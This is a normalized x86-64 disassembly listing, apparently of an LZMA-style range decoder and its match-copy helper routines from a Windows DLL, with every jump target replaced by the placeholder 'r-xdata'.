cmp r9d 0x1000000
jae r-xdata
mov r9d eax
mov eax 0x800
lea rdi [ r13 + 0xe6c ]
sub eax ecx
shr eax 0x5
add ax cx
cmp [ rsp + 0x10 ] 0x0
mov [ r13 + r11 * 2 ] ax
jne r-xdata
mov eax r9d
shr eax 0xb
imul eax ecx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
mov ebx [ rsp + 0x28 ]
mov r11 [ rsp + 0x18 ]
test r14 r14
mov ecx 0x8
mov rax r14
cmove rax r11
sub cl bl
movzx edx [ rax + rsi - 0x1 ]
mov eax r10d
and eax [ rsp + 0x24 ]
shr edx cl
mov ecx ebx
shl eax cl
add edx eax
lea eax [ rdx + rdx * 2 ]
mov rdx [ rsp + 0x90 ]
shl eax 0x8
lea rdi [ rdi + rax * 2 ]
jmp r-xdata
test r10d r10d
je r-xdata
sub r9d eax
sub r8d eax
mov eax ecx
shr eax 0x5
sub cx ax
cmp [ rsp + 0x10 ] 0x0
mov [ r13 + r10 * 2 + 0x180 ] cx
jne r-xdata
mov r9d eax
mov eax 0x800
lea rdx [ r13 + 0x664 ]
sub eax ecx
mov r11d 0x8
shr eax 0x5
add ax cx
add r15d 0xc
mov [ r13 + r10 * 2 + 0x180 ] ax
jmp r-xdata
cmp r15d 0x7
jae r-xdata
mov r11 [ rsp + 0x18 ]
movzx edx [ r13 + r10 * 2 + 0x198 ]
cmp r9d 0x1000000
jae r-xdata
cmp [ rsp + 0xa8 ] 0x0
je r-xdata
movzx ecx [ rdx ]
cmp r9d 0x1000000
jae r-xdata
mov eax [ rsp ]
xor ecx ecx
mov ebx 0x100
cmp r14 rax
cmovb rcx r11
sub rcx rax
mov eax 0x6
add rcx [ rdx + 0x18 ]
cmp r15d 0xa
movzx esi [ rcx + r14 ]
mov ecx 0x3
cmovb eax ecx
lea edx [ rcx - 0x2 ]
sub r15d eax
cmp r15d 0x4
mov eax 0x3
mov edx 0x1
cmovb eax r15d
sub r15d eax
nop [ rax + rax ] ax
mov ecx r9d
shr ecx 0xb
imul ecx edx
cmp r8d ecx
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
mov eax 0x1
mov eax r9d
shr eax 0xb
imul eax ecx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
mov eax r9d
shr eax 0xb
imul eax ecx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
mov eax r9d
shr eax 0xb
imul eax ecx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
mov eax edx
sub r9d ecx
sub r8d ecx
shr eax 0x5
sub dx ax
mov [ r13 + r10 * 2 + 0x198 ] dx
movzx ecx [ r13 + r10 * 2 + 0x1b0 ]
cmp r9d 0x1000000
jae r-xdata
mov eax 0x800
mov r9d ecx
sub eax edx
shr eax 0x5
add ax dx
mov [ r13 + r10 * 2 + 0x198 ] ax
movzx edx [ r13 + r11 * 2 + 0x1e0 ]
cmp ecx 0x1000000
jae r-xdata
sub r9d eax
sub r8d eax
mov eax ecx
shr eax 0x5
sub cx ax
mov [ rdx ] cx
movzx ecx [ rdx + 0x2 ]
cmp r9d 0x1000000
jae r-xdata
mov r9d eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
mov [ rdx ] ax
lea eax [ rbx * 8 ]
lea r10 [ rdx + rax * 2 + 0x4 ]
xor eax eax
mov ebx eax
jmp r-xdata
sub r9d eax
sub r8d eax
mov eax ecx
shr eax 0x5
lea edx [ rdx + rdx + 0x1 ]
sub cx ax
mov [ rdi + r10 * 2 ] cx
mov r9d eax
mov eax 0x800
not r11d
sub eax ecx
shr eax 0x5
add ax cx
add edx edx
mov [ rdi + r10 * 2 ] ax
jmp r-xdata
sub r9d eax
sub r8d eax
mov eax ecx
shr eax 0x5
lea edx [ rdx + rdx + 0x1 ]
sub cx ax
mov [ rdi + r10 * 2 ] cx
mov r9d eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
add edx edx
mov [ rdi + r10 * 2 ] ax
jmp r-xdata
mov eax r9d
shr eax 0xb
imul eax ecx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
mov eax r9d
shr eax 0xb
imul eax edx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
mov eax r9d
shr eax 0xb
imul eax ecx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
mov edx 0x1
mov r12d edx
nop [ rax + rax ] eax
add esi esi
mov eax ebx
mov r11d ebx
and r11d esi
mov r10d r11d
add r10 rax
mov eax edx
add r10 rax
movzx ecx [ rdi + r10 * 2 ]
cmp r9d 0x1000000
jae r-xdata
mov rsi [ rsp + 0x30 ]
and ebx r11d
cmp edx 0x100
jb r-xdata
mov r10d edx
movzx ecx [ rdi + r10 * 2 ]
cmp r9d 0x1000000
jae r-xdata
jmp r-xdata
cmp edx 0x100
jb r-xdata
sub r9d eax
sub r8d eax
mov eax ecx
shr eax 0x5
sub cx ax
mov [ r13 + r10 * 2 + 0x1b0 ] cx
movzx ecx [ r13 + r10 * 2 + 0x1c8 ]
cmp r9d 0x1000000
jae r-xdata
mov r9d eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
mov [ r13 + r10 * 2 + 0x1b0 ] ax
mov eax [ rsp + 0x4 ]
jmp r-xdata
sub r9d eax
sub r8d eax
mov eax edx
shr eax 0x5
sub dx ax
mov [ r13 + r11 * 2 + 0x1e0 ] dx
jmp r-xdata
mov r10d [ rsp + 0xa8 ]
mov r9d eax
xor ecx ecx
mov eax 0x800
sub eax edx
shr eax 0x5
add ax dx
mov [ r13 + r11 * 2 + 0x1e0 ] ax
mov eax [ rsp ]
cmp r14 rax
cmovb rcx [ rsp + 0x18 ]
inc r10d
sub rcx rax
mov [ rsp + 0xa8 ] r10d
add rcx r14
inc r14
cmp r15d 0x7
movzx eax [ rcx + rsi ]
mov ecx 0x9
mov [ r14 + rsi - 0x1 ] al
mov eax 0xb
cmovb eax ecx
mov r15d eax
jmp r-xdata
sub r9d eax
sub r8d eax
mov eax ecx
shr eax 0x5
lea r10 [ rdx + 0x204 ]
mov ebx 0x10
sub cx ax
mov r11d 0x100
mov [ rdx + 0x2 ] cx
mov r9d eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
mov [ rdx + 0x2 ] ax
lea eax [ rbx * 8 ]
mov ebx r11d
lea r10 [ rdx + rax * 2 + 0x104 ]
jmp r-xdata
mov eax r9d
shr eax 0xb
imul eax ecx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
mov edi [ rsp + 0xc ]
mov r10d [ rsp + 0xa8 ]
mov [ r14 + rsi ] dl
inc r14
inc r10d
mov [ rsp + 0xa8 ] r10d
jmp r-xdata
mov eax r9d
shr eax 0xb
imul eax ecx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
mov ecx [ rsp ]
mov [ rsp ] eax
mov [ rsp + 0x4 ] ecx
cmp r15d 0x7
mov eax 0xb
mov r11d 0x8
cmovb eax r11d
lea rdx [ r13 + 0xa68 ]
mov r15d eax
cmp r14 [ rsp + 0x98 ]
jae r-xdata
sub r9d eax
sub r8d eax
mov eax ecx
shr eax 0x5
lea r12d [ r12 + r12 + 0x1 ]
sub cx ax
inc rdx
mov [ rdx + r10 - 0x1 ] cx
mov r9d eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
add r12d r12d
mov [ rdx + r10 ] ax
jmp r-xdata
cmp r9d 0x1000000
jae r-xdata
cmp rbp [ rsp + 0xa0 ]
jae r-xdata
sub r9d eax
sub r8d eax
mov eax ecx
shr eax 0x5
sub cx ax
mov eax edi
mov [ r13 + r10 * 2 + 0x1c8 ] cx
mov ecx [ rsp + 0x8 ]
mov edi ecx
mov [ rsp + 0xc ] ecx
mov r9d eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
mov [ r13 + r10 * 2 + 0x1c8 ] ax
mov eax [ rsp + 0x8 ]
jmp r-xdata
add rdx rdx
movzx ecx [ rdx + r10 ]
cmp r9d 0x1000000
jae r-xdata
sub ebx r11d
add r12d ebx
cmp r15d 0xc
jb r-xdata
cmp r12d r11d
jb r-xdata
mov rax [ rsp + 0x90 ]
mov ecx [ rsp + 0xa8 ]
mov [ rax + 0x40 ] ecx
mov ecx [ rsp ]
mov [ rax + 0x20 ] rbp
mov [ rax + 0x4c ] ecx
mov ecx [ rsp + 0x4 ]
mov [ rax + 0x28 ] r9d
mov [ rax + 0x50 ] ecx
mov ecx [ rsp + 0x8 ]
mov [ rax + 0x2c ] r8d
mov [ rax + 0x5c ] r12d
mov [ rax + 0x30 ] r14
mov [ rax + 0x58 ] edi
mov [ rax + 0x54 ] ecx
mov [ rax + 0x48 ] r15d
xor eax eax
jmp r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
mov rdx [ rsp + 0x90 ]
mov r11d [ rsp + 0x20 ]
jmp r-xdata
mov ecx [ rsp + 0x4 ]
mov [ rsp + 0x8 ] ecx
mov r11d [ rsp ]
cmp r12d 0x4
mov ebx 0x3
mov eax ebx
cmovb eax r12d
shl eax 0x6
lea rcx [ r13 + rax * 2 + 0x360 ]
movzx edx [ rcx + 0x2 ]
cmp r9d 0x1000000
jae r-xdata
add rsp 0x48
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov ebx r10d
and ebx r11d
mov r11d r15d
shl r11d 0x4
mov eax ebx
add r11 rax
movzx ecx [ r13 + r11 * 2 ]
cmp r9d 0x1000000
jae r-xdata
mov rbx [ rsp + 0x18 ]
mov r10d [ rsp + 0xa8 ]
mov rcx rax
sub rcx r14
mov eax r12d
mov edx r12d
cmp rcx rax
mov eax r11d
cmovb edx ecx
xor ecx ecx
cmp r14 rax
cmovb rcx rbx
add r10d edx
sub r12d edx
sub rcx rax
mov [ rsp + 0xa8 ] r10d
mov r11d edx
add rcx r14
lea rax [ rdx + rcx ]
cmp rax rbx
ja r-xdata
mov eax r9d
shr eax 0xb
imul eax edx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
xor edi edi
nop [ rax + rax ] eax
lea rdx [ r14 + rsi ]
sub rcx r14
add r14 r11
lea r10 [ r11 + rdx ]
nop
sub r9d eax
sub r8d eax
mov eax edx
shr eax 0x5
mov r11d ebx
mov r10 rbx
sub dx ax
mov [ rcx + 0x2 ] dx
mov r9d eax
mov eax 0x800
mov r11d 0x2
sub eax edx
mov r10d r11d
shr eax 0x5
add ax dx
mov [ rcx + 0x2 ] ax
jmp r-xdata
movzx eax [ rcx + rsi ]
inc rcx
inc r14
cmp rcx rbx
mov [ r14 + rsi - 0x1 ] al
cmove rcx rdi
dec edx
jne r-xdata
movzx eax [ rcx + rdx ]
inc rdx
mov [ rdx - 0x1 ] al
cmp rdx r10
jne r-xdata
mov r10d [ rsp + 0xa8 ]
jmp r-xdata
mov eax r9d
shr eax 0xb
imul eax edx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
add r10 r10
movzx edx [ r10 + rcx ]
cmp r9d 0x1000000
jae r-xdata
sub r9d eax
sub r8d eax
mov eax edx
shr eax 0x5
lea r11d [ r11 + r11 + 0x1 ]
sub dx ax
inc r10
mov [ r10 + rcx - 0x1 ] dx
mov r9d eax
mov eax 0x800
sub eax edx
shr eax 0x5
add ax dx
add r11d r11d
mov [ r10 + rcx ] ax
jmp r-xdata
mov eax r9d
shr eax 0xb
imul eax edx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
movzx edx [ rcx + r10 * 2 ]
cmp r9d 0x1000000
jae r-xdata
sub r9d eax
sub r8d eax
mov eax edx
shr eax 0x5
sub dx ax
mov [ rcx + r10 * 2 ] dx
lea r10d [ r11 + r11 + 0x1 ]
mov r9d eax
mov eax 0x800
sub eax edx
shr eax 0x5
add ax dx
mov [ rcx + r10 * 2 ] ax
lea r10d [ r11 + r11 ]
jmp r-xdata
mov eax r9d
shr eax 0xb
imul eax edx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
movzx edx [ rcx + r10 * 2 ]
cmp r9d 0x1000000
jae r-xdata
sub r9d eax
sub r8d eax
mov eax edx
shr eax 0x5
sub dx ax
mov [ rcx + r10 * 2 ] dx
lea r10d [ r10 + r10 + 0x1 ]
mov r9d eax
mov eax 0x800
sub eax edx
shr eax 0x5
add ax dx
mov [ rcx + r10 * 2 ] ax
add r10d r10d
jmp r-xdata
mov eax r9d
shr eax 0xb
imul eax edx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
movzx edx [ rcx + r10 * 2 ]
cmp r9d 0x1000000
jae r-xdata
sub r9d eax
sub r8d eax
mov eax edx
shr eax 0x5
sub dx ax
mov [ rcx + r10 * 2 ] dx
lea r10d [ r10 + r10 + 0x1 ]
mov r9d eax
mov eax 0x800
sub eax edx
shr eax 0x5
add ax dx
mov [ rcx + r10 * 2 ] ax
add r10d r10d
jmp r-xdata
mov eax r9d
shr eax 0xb
imul eax edx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
movzx edx [ rcx + r10 * 2 ]
cmp r9d 0x1000000
jae r-xdata
sub r9d eax
sub r8d eax
mov eax edx
shr eax 0x5
sub dx ax
mov [ rcx + r10 * 2 ] dx
lea r10d [ r10 + r10 + 0x1 ]
mov r9d eax
mov eax 0x800
sub eax edx
shr eax 0x5
add ax dx
mov [ rcx + r10 * 2 ] ax
add r10d r10d
jmp r-xdata
mov ecx [ rsp + 0x8 ]
mov eax [ rsp ]
lea r11d [ r10 + 0x1 ]
mov edi ecx
mov [ rsp + 0xc ] ecx
mov ecx [ rsp + 0x4 ]
mov [ rsp + 0x4 ] eax
mov eax [ rsp + 0x10 ]
mov [ rsp ] r11d
mov [ rsp + 0x8 ] ecx
test eax eax
jne r-xdata
mov r11d r10d
mov eax r10d
and r10d 0x1
shr r11d 0x1
or r10d 0x2
dec r11d
cmp eax 0xe
jae r-xdata
add r10d 0xffffffc0
cmp r10d 0x4
jb r-xdata
cmp r10d eax
cmp r10d [ rsp + 0xa8 ]
jmp r-xdata
sub r11d 0x4
nop
mov ecx r11d
mov ebx 0x1
shl r10d cl
mov edx ebx
mov ecx r10d
sub rcx rax
lea rdi [ r13 + rcx * 2 + 0x55e ]
nop [ rax + rax ] eax
cmp r15d 0x13
mov eax 0xa
mov ecx 0x7
cmovb eax ecx
mov r15d eax
jmp r-xdata
jae r-xdata
shr r9d 0x1
sub r8d r9d
mov eax r8d
shr eax 0x1f
neg eax
lea r10d [ rax + r10 * 2 + 0x1 ]
and eax r9d
add r8d eax
dec r11d
jne r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
mov eax r9d
shr eax 0xb
imul eax ecx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
mov rax [ rsp + 0x98 ]
add r12d 0x2
cmp rax r14
je r-xdata
cmp r9d 0x1000000
jae r-xdata
movzx ecx [ r13 + 0x646 ]
shl r10d 0x4
cmp r9d 0x1000000
jae r-xdata
sub r9d eax
sub r8d eax
mov eax ecx
shr eax 0x5
sub cx ax
inc rdx
or r10d ebx
mov [ rdx + rdi - 0x1 ] cx
mov r9d eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
mov [ rdx + rdi ] ax
jmp r-xdata
mov eax r9d
shr eax 0xb
imul eax ecx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
add rdx rdx
movzx ecx [ rdx + rdi ]
cmp r9d 0x1000000
jae r-xdata
jmp r-xdata
add ebx ebx
dec r11d
jne r-xdata
sub r9d eax
sub r8d eax
mov eax ecx
shr eax 0x5
mov r11d ebx
mov rdx rbx
sub cx ax
or r10d 0x1
mov [ r13 + 0x646 ] cx
mov r9d eax
mov eax 0x800
mov edx 0x2
sub eax ecx
mov r11d edx
shr eax 0x5
add ax cx
mov [ r13 + 0x646 ] ax
jmp r-xdata
mov eax r9d
shr eax 0xb
imul eax ecx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
add rdx rdx
movzx ecx [ rdx + r13 + 0x644 ]
cmp r9d 0x1000000
jae r-xdata
sub r9d eax
sub r8d eax
mov eax ecx
shr eax 0x5
lea r11d [ r11 + r11 + 0x1 ]
sub cx ax
inc rdx
or r10d 0x2
mov [ rdx + r13 + 0x643 ] cx
mov r9d eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
add r11d r11d
mov [ rdx + r13 + 0x644 ] ax
jmp r-xdata
mov eax r9d
shr eax 0xb
imul eax ecx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
movzx ecx [ r13 + rdx * 2 + 0x644 ]
cmp r9d 0x1000000
jae r-xdata
sub r9d eax
sub r8d eax
mov eax ecx
shr eax 0x5
sub cx ax
lea eax [ r11 + r11 + 0x1 ]
or r10d 0x4
mov [ r13 + rdx * 2 + 0x644 ] cx
mov r9d eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
mov [ r13 + rdx * 2 + 0x644 ] ax
lea eax [ r11 + r11 ]
jmp r-xdata
mov eax r9d
shr eax 0xb
imul eax ecx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
movzx ecx [ r13 + rax * 2 + 0x644 ]
mov edx eax
cmp r9d 0x1000000
jae r-xdata
sub r9d eax
sub r8d eax
mov eax ecx
shr eax 0x5
sub cx ax
or r10d 0x8
mov [ r13 + rdx * 2 + 0x644 ] cx
mov r9d eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
mov [ r13 + rdx * 2 + 0x644 ] ax
jmp r-xdata
add r12d 0x112
add r15d 0xfffffff4
cmp r10d 0xffffffff
je r-xdata
sub_1800069a0
sub rsp 0x8
mov r9d [ rcx + 0x5c ]
mov r11 rdx
mov r8 rcx
test r9d r9d
je r-xdata
add rsp 0x8
retn
cmp r9d 0x112
jae r-xdata
mov r10 [ rcx + 0x30 ]
mov [ rsp + 0x10 ] rsi
mov rsi [ rcx + 0x38 ]
mov [ rsp ] rdi
mov rdi [ rcx + 0x18 ]
mov rcx r11
sub rcx r10
mov edx r9d
cmp rcx r9
jae r-xdata
cmp [ r8 + 0x44 ] 0x0
jne r-xdata
mov edx r11d
sub edx r10d
add [ r8 + 0x40 ] edx
sub r9d edx
mov [ r8 + 0x5c ] r9d
movsxd r9 [ r8 + 0x4c ]
test edx edx
je r-xdata
mov ecx [ r8 + 0xc ]
mov eax ecx
sub eax [ r8 + 0x40 ]
cmp eax edx
ja r-xdata
mov rdi [ rsp ]
mov rsi [ rsp + 0x10 ]
mov [ r8 + 0x30 ] r10
mov ecx [ r8 + 0x4c ]
nop [ rax ] eax
mov [ r8 + 0x44 ] ecx
xor eax eax
cmp r10 rcx
cmovb rax rsi
sub rax r9
add rax r10
inc r10
dec edx
movzx eax [ rax + rdi ]
mov [ r10 + rdi - 0x1 ] al
jne r-xdata
sub_180006a60
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r13 r8
mov rdi rdx
mov rbx rcx
mov r14d 0x112
mov [ rsp + 0x40 ] rsi
nop [ rax ] eax
mov r8 r13
mov rcx rbx
call sub_180005bb0
test eax eax
jne r-xdata
mov r8d [ rbx + 0xc ]
mov rcx [ rbx + 0x30 ]
mov rax rdi
sub r8d [ rbx + 0x40 ]
sub rax rcx
cmp rax r8
jbe r-xdata
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov r11d [ rbx + 0x40 ]
mov edx [ rbx + 0xc ]
cmp r11d edx
jb r-xdata
lea rdx [ r8 + rcx ]
mov r8d [ rbx + 0x5c ]
test r8d r8d
je r-xdata
mov [ rbx + 0x44 ] edx
cmp [ rbx + 0x30 ] rdi
jae r-xdata
cmp r8d r14d
jae r-xdata
mov eax [ rbx + 0x5c ]
cmp eax r14d
cmova eax r14d
mov [ rbx + 0x5c ] eax
xor eax eax
cmp [ rbx + 0x20 ] r13
jae r-xdata
mov r9 [ rbx + 0x30 ]
mov rbp [ rbx + 0x18 ]
mov r12 [ rbx + 0x38 ]
mov esi [ rbx + 0x4c ]
mov rcx rdi
mov r10d r8d
sub rcx r9
cmp rcx r8
jae r-xdata
cmp [ rbx + 0x5c ] r14d
jb r-xdata
cmp [ rbx + 0x44 ] 0x0
jne r-xdata
mov r10d edi
sub r10d r9d
cmp [ rbx + 0x44 ] 0x0
mov rdx rdi
jne r-xdata
sub r8d r10d
lea eax [ r11 + r10 ]
movsxd rdx esi
mov [ rbx + 0x40 ] eax
mov [ rbx + 0x5c ] r8d
test r10d r10d
je r-xdata
mov eax edx
sub eax r11d
cmp eax r10d
ja r-xdata
mov [ rbx + 0x30 ] r9
xor eax eax
cmp r9 rsi
cmovb rax r12
sub rax rdx
add rax r9
inc r9
dec r10d
movzx eax [ rax + rbp ]
mov [ r9 + rbp - 0x1 ] al
jne r-xdata
mov [ rbx + 0x44 ] edx
sub_180006ba0
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
push r13
push r15
mov r10d [ rcx + 0x28 ]
mov esi [ rcx + 0x48 ]
mov r12d [ rcx + 0x40 ]
mov r9d [ rcx + 0x2c ]
mov r15 [ rcx + 0x10 ]
lea rdi [ rdx + r8 ]
mov rbx rcx
mov ecx [ rcx + 0x8 ]
mov r8d esi
shl r8d 0x4
mov r13d 0x1
mov r11 rdx
mov ebp r13d
shl ebp cl
dec ebp
and ebp r12d
mov eax ebp
add r8 rax
movzx ecx [ r15 + r8 * 2 ]
cmp r10d 0x1000000
jae r-xdata
mov eax r10d
mov [ rsp + 0x38 ] r14
shr eax 0xb
imul eax ecx
cmp r9d eax
jae r-xdata
cmp rdx rdi
jb r-xdata
movzx edx [ r15 + rsi * 2 + 0x180 ]
sub r10d eax
sub r9d eax
mov rcx rsi
cmp r10d 0x1000000
jae r-xdata
cmp [ rbx + 0x44 ] 0x0
mov r10d eax
lea r14 [ r15 + 0xe6c ]
jne r-xdata
movzx eax [ rdx ]
shl r9d 0x8
shl r10d 0x8
or r9d eax
inc r11
xor eax eax
jmp r-xdata
xor esi esi
mov eax r10d
shr eax 0xb
lea r12d [ rsi + 0x3 ]
imul eax edx
cmp r9d eax
jae r-xdata
cmp r11 rdi
jae r-xdata
mov rcx [ rbx + 0x30 ]
test rcx rcx
jne r-xdata
test r12d r12d
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
pop r15
pop r13
pop r12
pop rdi
pop rsi
retn
movzx edx [ r15 + rcx * 2 + 0x198 ]
sub r10d eax
sub r9d eax
mov [ rsp + 0x30 ] r12d
cmp r10d 0x1000000
jae r-xdata
mov r10d eax
mov r14d esi
lea rdx [ r15 + 0x664 ]
mov [ rsp + 0x30 ] 0x2
jmp r-xdata
xor eax eax
movzx eax [ r11 ]
shl r9d 0x8
shl r10d 0x8
or r9d eax
inc r11
mov rax [ rbx + 0x18 ]
mov edx [ rbx ]
movzx r8d [ rax + rcx - 0x1 ]
mov ecx 0x8
mov eax r13d
sub cl dl
shr r8d cl
mov ecx [ rbx + 0x4 ]
shl eax cl
mov ecx edx
dec eax
and eax r12d
shl eax cl
add r8d eax
lea eax [ r8 + r8 * 2 ]
shl eax 0x8
lea r14 [ r14 + rax * 2 ]
mov rcx [ rbx + 0x38 ]
cmp esi 0x7
jae r-xdata
mov eax r10d
shr eax 0xb
imul eax edx
cmp r9d eax
jae r-xdata
cmp r11 rdi
jae r-xdata
movzx ecx [ rdx ]
cmp r10d 0x1000000
jae r-xdata
mov ecx [ rbx + 0x4c ]
mov rdx [ rbx + 0x30 ]
cmp rdx rcx
jae r-xdata
mov edx r13d
mov rcx r13
mov ebp 0x100
nop [ rax + rax ] ax
movzx edx [ r15 + rcx * 2 + 0x1b0 ]
sub r10d eax
sub r9d eax
cmp r10d 0x1000000
jae r-xdata
movzx ecx [ r15 + r8 * 2 + 0x1e0 ]
mov r10d eax
cmp eax 0x1000000
jae r-xdata
movzx eax [ r11 ]
shl r9d 0x8
shl r10d 0x8
or r9d eax
inc r11
mov eax r10d
shr eax 0xb
imul eax ecx
cmp r9d eax
jae r-xdata
cmp r11 rdi
jae r-xdata
xor esi esi
mov rsi [ rbx + 0x38 ]
jmp r-xdata
mov eax r10d
shr eax 0xb
imul eax r8d
cmp r9d eax
jae r-xdata
cmp r11 rdi
jae r-xdata
mov eax r10d
shr eax 0xb
imul eax edx
cmp r9d eax
jae r-xdata
cmp r11 rdi
jae r-xdata
mov eax r10d
shr eax 0xb
imul eax ecx
cmp r9d eax
jae r-xdata
cmp r11 rdi
jae r-xdata
movzx ecx [ rdx + 0x2 ]
sub r10d eax
sub r9d eax
cmp r10d 0x1000000
jae r-xdata
mov r10d eax
lea eax [ rbp * 8 ]
mov ebp 0x8
lea rbx [ rdx + rax * 2 + 0x4 ]
jmp r-xdata
movzx eax [ r11 ]
shl r9d 0x8
shl r10d 0x8
or r9d eax
inc r11
mov eax r10d
shr eax 0xb
imul eax ecx
cmp r9d eax
jae r-xdata
cmp r11 rdi
jae r-xdata
mov rax [ rbx + 0x18 ]
mov ebp 0x100
mov ebx r13d
sub rax rcx
mov r8d ebp
add rax rdx
movzx r12d [ rax + rsi ]
mov rsi r13
nop [ rax ] eax
sub r10d eax
sub r9d eax
lea edx [ rdx + rdx + 0x1 ]
inc rcx
mov r10d eax
add edx edx
jmp r-xdata
movzx eax [ r11 ]
shl r9d 0x8
shl r10d 0x8
or r9d eax
inc r11
movzx edx [ r15 + rcx * 2 + 0x1c8 ]
sub r10d eax
sub r9d eax
cmp r10d 0x1000000
jae r-xdata
mov r10d eax
jmp r-xdata
movzx eax [ r11 ]
shl r9d 0x8
shl r10d 0x8
or r9d eax
inc r11
sub r10d eax
sub r9d eax
cmp eax 0x1000000
jae r-xdata
movzx eax [ r11 ]
shl r9d 0x8
shl r10d 0x8
or r9d eax
inc r11
mov eax r10d
shr eax 0xb
imul eax ecx
cmp r9d eax
jae r-xdata
cmp r11 rdi
jae r-xdata
mov ecx r13d
mov rdx r13
nop [ rax + rax ] ax
sub r10d eax
lea ebx [ rbx + rbx + 0x1 ]
lea rsi [ rsi + rsi + 0x1 ]
sub r9d eax
add ebx ebx
mov r10d eax
not edx
add rsi rsi
jmp r-xdata
movzx eax [ r11 ]
shl r9d 0x8
shl r10d 0x8
or r9d eax
inc r11
add rcx rcx
movzx r8d [ rcx + r14 ]
cmp r10d 0x1000000
jae r-xdata
mov eax r13d
jmp r-xdata
cmp edx ebp
jb r-xdata
mov eax r10d
shr eax 0xb
imul eax edx
cmp r9d eax
jae r-xdata
cmp r11 rdi
jae r-xdata
mov r14d 0xc
lea rdx [ r15 + 0xa68 ]
mov eax r12d
jmp r-xdata
cmp r11 rdi
jae r-xdata
sub r10d eax
lea rbx [ rdx + 0x204 ]
mov esi 0x10
sub r9d eax
mov ebp 0x100
mov r10d eax
lea eax [ rbp * 8 ]
mov ebp 0x8
lea rbx [ rdx + rax * 2 + 0x104 ]
mov esi ebp
jmp r-xdata
movzx eax [ r11 ]
shl r9d 0x8
shl r10d 0x8
or r9d eax
inc r11
mov eax r10d
shr eax 0xb
imul eax r8d
cmp r9d eax
jae r-xdata
cmp r11 rdi
jae r-xdata
add r12d r12d
mov edx r8d
mov ecx r8d
and edx r12d
mov eax edx
add rax rsi
add rcx rax
movzx ecx [ r14 + rcx * 2 ]
cmp r10d 0x1000000
jae r-xdata
mov eax r13d
jmp r-xdata
and r8d edx
cmp ebx ebp
jb r-xdata
cmp r10d 0x1000000
jae r-xdata
mov r10d eax
jmp r-xdata
movzx eax [ r11 ]
shl r9d 0x8
shl r10d 0x8
or r9d eax
inc r11
mov r14 [ rsp + 0x38 ]
sub r10d eax
sub r9d eax
lea ecx [ rcx + rcx + 0x1 ]
inc rdx
mov r10d eax
add ecx ecx
jmp r-xdata
movzx eax [ r11 ]
shl r9d 0x8
shl r10d 0x8
or r9d eax
inc r11
cmp r11 rdi
jb r-xdata
add rdx rdx
movzx r8d [ rdx + rbx ]
cmp r10d 0x1000000
jae r-xdata
sub esi ebp
add ecx esi
cmp r14d 0x4
jae r-xdata
cmp ecx ebp
jb r-xdata
mov eax [ rsp + 0x30 ]
cmp ecx 0x4
